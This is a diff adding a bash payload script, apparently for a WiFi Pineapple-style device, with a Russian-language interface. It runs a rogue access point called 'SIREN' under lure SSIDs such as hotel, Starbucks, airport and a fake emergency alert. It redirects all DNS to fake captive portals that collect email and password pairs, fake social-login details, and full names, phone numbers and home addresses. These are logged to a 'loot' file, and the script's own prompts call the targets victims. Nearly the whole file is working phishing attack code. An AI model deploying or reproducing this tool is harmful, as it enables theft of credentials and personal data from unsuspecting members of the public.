@@ -1,0 +1,263 @@
+#!/bin/bash
+. /root/payloads/library/nullsec-ui.sh
+#═══════════════════════════════════════════════════════════════════════════════
+# SIREN — Система Социального Заманивания и Разведки
+# Разработчик: bad-antics
+# 
+# Продвинутый Captive Portal с множеством приманок
+#═══════════════════════════════════════════════════════════════════════════════
+
+# Подключаем библиотеку
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
+LOOT_DIR="/mmc/nullsec/siren"
+PORTAL_DIR="/mmc/nullsec/portals"
+mkdir -p "$LOOT_DIR" "$PORTAL_DIR/siren"
+
+PROMPT "    ╔═╗╦╦═╗╔═╗╔╗╔
+    ╚═╗║╠╦╝║╣ ║║║
+    ╚═╝╩╩╚═╚═╝╝╚╝
+━━━━━━━━━━━━━━━━━━━━━━━━━
+БЕСПРОВОДНАЯ ПРИМАНКА
+
+Поймай их на крючок
+неотразимыми именами сетей.
+
+Они подключатся.
+Они сдадут данные.
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Разработано: bad-antics"
+
+PROMPT "ПЕСНИ SIREN:
+
+1. WiFi Отеля
+2. Бесплатный WiFi в Аэропорту
+3. Кофейня
+4. Социальная сеть
+5. Гостевая корпоративная сеть
+6. Бесплатный Премиум WiFi
+7. Экстренное оповещение
+8. Опрос WiFi (с призом)"
+
+SONG=$(NUMBER_PICKER "Выбери песню (1-8):" 1)
+
+# Устанавливаем SSID и тип портала
+case $SONG in
+    1) SSID="Marriott_Guest_WiFi";     PORTAL_TYPE="hotel" ;;
+    2) SSID="Airport_Free_WiFi";       PORTAL_TYPE="airport" ;;
+    3) SSID="Starbucks_WiFi";          PORTAL_TYPE="coffee" ;;
+    4) SSID="Free_WiFi_Social";        PORTAL_TYPE="social" ;;
+    5) SSID="GUEST-NETWORK";           PORTAL_TYPE="corporate" ;;
+    6) SSID="FREE_PREMIUM_WIFI";       PORTAL_TYPE="premium" ;;
+    7) SSID="EMERGENCY_ALERT";         PORTAL_TYPE="government" ;;
+    8) SSID="WiFi_Survey_WIN";         PORTAL_TYPE="survey" ;;
+esac
+
+CUSTOM_SSID=$(TEXT_PICKER "SSID (или оставь по умолчанию):" "$SSID")
+[ -n "$CUSTOM_SSID" ] && SSID="$CUSTOM_SSID"
+
+CONFIRMATION_DIALOG "РАЗВЁРТЫВАНИЕ SIREN:
+SSID: $SSID
+Портал: $PORTAL_TYPE
+
+Жертвы будут заманиваться
+и сдавать свои данные.
+
+Развернуть?"
+[ $? -ne 0 ] && exit 0
+
+INTERFACE="$IFACE"
+LOOT_FILE="$LOOT_DIR/siren_$(date +%Y%m%d_%H%M%S).txt"
+
+# Создание портала
+create_portal() {
+    local TYPE="$1"
+    local HTML="$PORTAL_DIR/siren/index.html"
+    
+    case $TYPE in
+        hotel)
+            cat > "$HTML" << 'HOTEL_HTML'
+<!DOCTYPE html>
+<html><head><title>Гостевой WiFi Отеля</title>
+<style>body{font-family:Arial;background:#1a1a2e;color:#fff;margin:0;padding:20px}
+.container{max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px}
+h1{color:#e94560;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
+button{width:100%;padding:15px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
+</head><body><div class="container"><h1>🏨 Гостевой WiFi Отеля</h1>
+<p>Введите данные номера для подключения</p>
+<form action="/capture" method="POST">
+<input name="room" placeholder="Номер комнаты" required>
+<input name="lastname" placeholder="Фамилия" required>
+<input name="email" type="email" placeholder="Email" required>
+<button type="submit">Подключиться к WiFi</button>
+</form></div></body></html>
+HOTEL_HTML
+            ;;
+        social)
+            cat > "$HTML" << 'SOCIAL_HTML'
+<!DOCTYPE html>
+<html><head><title>Бесплатный WiFi — Вход</title>
+<style>body{font-family:Arial;background:#0f0f0f;color:#fff;margin:0;padding:20px}
+.container{max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px}
+.btn{width:100%;padding:15px;margin:5px 0;border:none;border-radius:5px;cursor:pointer;font-size:16px}
+.fb{background:#1877f2;color:#fff}.google{background:#fff;color:#333}.twitter{background:#1da1f2;color:#fff}</style>
+</head><body><div class="container"><h1>🌐 Бесплатный WiFi</h1>
+<p>Войдите через социальную сеть</p>
+<form action="/capture" method="POST">
+<input name="email" type="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0">
+<input name="password" type="password" placeholder="Пароль" style="width:100%;padding:12px;margin:10px 0">
+<button class="btn fb">Продолжить через Facebook</button>
+<button class="btn google">Продолжить через Google</button>
+<button class="btn twitter">Продолжить через Twitter</button>
+</form></div></body></html>
+SOCIAL_HTML
+            ;;
+        government)
+            cat > "$HTML" << 'GOV_HTML'
+<!DOCTYPE html>
+<html><head><title>⚠️ Система экстренного оповещения</title>
+<style>body{font-family:Arial;background:#8B0000;color:#fff;margin:0;padding:20px}
+.container{max-width:500px;margin:0 auto;background:#000;padding:30px;border:3px solid #ff0;border-radius:10px}
+h1{color:#ff0;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
+button{width:100%;padding:15px;background:#ff0;color:#000;border:none;border-radius:5px;cursor:pointer;font-weight:bold}</style>
+</head><body><div class="container"><h1>⚠️ ЭКСТРЕННОЕ ОПОВЕЩЕНИЕ ⚠️</h1>
+<p style="color:#ff0">ТРЕБУЕТСЯ ОБЯЗАТЕЛЬНАЯ РЕГИСТРАЦИЯ</p>
+<p>В связи с угрозой безопасности все устройства должны быть зарегистрированы.</p>
+<form action="/capture" method="POST">
+<input name="fullname" placeholder="ФИО полностью" required>
+<input name="phone" placeholder="Номер телефона" required>
+<input name="email" type="email" placeholder="Email" required>
+<input name="address" placeholder="Домашний адрес" required>
+<button type="submit">ЗАРЕГИСТРИРОВАТЬ УСТРОЙСТВО</button>
+</form></div></body></html>
+GOV_HTML
+            ;;
+        *)
+            cat > "$HTML" << 'DEFAULT_HTML'
+<!DOCTYPE html>
+<html><head><title>Бесплатный WiFi</title>
+<style>body{font-family:Arial;background:#121212;color:#fff;margin:0;padding:20px}
+.container{max-width:400px;margin:0 auto;background:#1e1e1e;padding:30px;border-radius:10px}
+h1{text-align:center}input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px}
+button{width:100%;padding:15px;background:#4CAF50;color:#fff;border:none;border-radius:5px;cursor:pointer}</style>
+</head><body><div class="container"><h1>📶 Бесплатный WiFi</h1>
+<form action="/capture" method="POST">
+<input name="email" type="email" placeholder="Email" required>
+<input name="password" type="password" placeholder="Придумайте пароль" required>
+<button type="submit">Получить доступ</button>
+</form></div></body></html>
+DEFAULT_HTML
+            ;;
+    esac
+}
+
+# Создание скрипта захвата данных
+cat > "$PORTAL_DIR/siren/capture.sh" << CAPTURE
+#!/bin/bash
+echo "[$(date)] \$QUERY_STRING" >> "$LOOT_FILE"
+echo "HTTP/1.1 302 Found"
+echo "Location: http://success.html"
+echo ""
+CAPTURE
+chmod +x "$PORTAL_DIR/siren/capture.sh"
+
+# Страница успеха
+cat > "$PORTAL_DIR/siren/success.html" << 'SUCCESS'
+<!DOCTYPE html>
+<html><head><title>Подключено!</title>
+<style>body{font-family:Arial;background:#1a1a1a;color:#fff;text-align:center;padding:50px}
+h1{color:#4CAF50}p{font-size:18px}</style>
+</head><body><h1>✓ Подключено успешно!</h1>
+<p>Теперь у вас есть доступ в интернет.</p>
+<p>Перенаправление...</p>
+<script>setTimeout(()=>window.location='http://www.google.com',3000)</script>
+</body></html>
+SUCCESS
+
+create_portal "$PORTAL_TYPE"
+
+cat > "$LOOT_FILE" << EOF
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SIREN — Журнал захвата учётных данных
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SSID: $SSID
+ Тип портала: $PORTAL_TYPE
+ Запущен: $(date)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ NullSec Pineapple Suite | Разработано: bad-antics
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ЗАХВАЧЕННЫЕ ДАННЫЕ:
+EOF
+
+LOG "SIREN поёт..."
+SPINNER_START "Заманиваем жертв на $SSID..."
+
+# Запуск точки доступа
+pkill hostapd dnsmasq 2>/dev/null
+sleep 1
+
+cat > /tmp/siren_hostapd.conf << HOSTAPD
+interface=$INTERFACE
+driver=nl80211
+ssid=$SSID
+channel=6
+hw_mode=g
+HOSTAPD
+
+cat > /tmp/siren_dnsmasq.conf << DNSMASQ
+interface=$INTERFACE
+dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
+address=/#/192.168.4.1
+DNSMASQ
+
+ifconfig $INTERFACE 192.168.4.1 netmask 255.255.255.0 up
+hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
+dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null
+
+# Запуск веб-сервера
+cd "$PORTAL_DIR/siren"
+python3 -m http.server 80 2>/dev/null &
+WEB_PID=$!
+
+PROMPT "SIREN АКТИВНА
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Транслируется: $SSID
+
+Портал: $PORTAL_TYPE
+Ожидаем жертв...
+
+Нажми OK чтобы остановить
+и посмотреть захваченные данные.
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Разработано: bad-antics"
+
+SPINNER_STOP
+
+# Очистка
+pkill hostapd dnsmasq 2>/dev/null
+kill $WEB_PID 2>/dev/null
+
+CAPTURES=$(grep -c "^\[" "$LOOT_FILE" 2>/dev/null || echo 0)
+
+cat >> "$LOOT_FILE" << EOF
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SIREN ОСТАНОВЛЕНА
+ Всего захвачено: $CAPTURES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ NullSec Pineapple Suite | Разработано: bad-antics
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+EOF
+
+PROMPT "SIREN ЗАМОЛКЛА
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Песня окончена.
+
+SSID: $SSID
+Захвачено: $CAPTURES
+
+Журнал: $LOOT_FILE
+━━━━━━━━━━━━━━━━━━━━━━━━━
+Разработано: bad-antics"
